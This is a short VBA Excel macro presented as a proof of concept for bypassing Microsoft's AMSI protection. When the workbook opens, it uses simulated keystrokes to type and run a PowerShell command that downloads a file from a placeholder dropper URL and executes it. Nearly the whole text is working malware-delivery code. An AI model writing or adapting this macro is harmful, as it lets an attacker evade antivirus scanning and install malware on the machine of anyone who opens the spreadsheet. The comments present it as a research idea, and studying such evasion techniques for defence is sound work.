'This is a macro vba script that bypasses AMSI protection by sending keys to the UI and dropping payload or malware on the system.
'This is actually a sloppy work in which interaction with the UI is being used instead of programmatically downloading and executing malware.
'However, the purpose of this script is to provide a PoC and an idea of how can we bypass AMSI protection by Microsoft

Private Sub Workbook_Open()
    On Error Resume Next
    Application.SendKeys "^{esc}"
    Application.Wait (Now() + TimeValue("00:00:03"))
    Application.SendKeys "powershell.exe ""wget DROPPER_URL_HERE"" -o $env:UserProfile\Downloads\temp.vbs;invoke-expression( ""$env:UserProfile\Downloads\temp.vbs"" ) "
    Application.Wait (Now() + TimeValue("00:00:03"))
    Application.SendKeys "~"
End Sub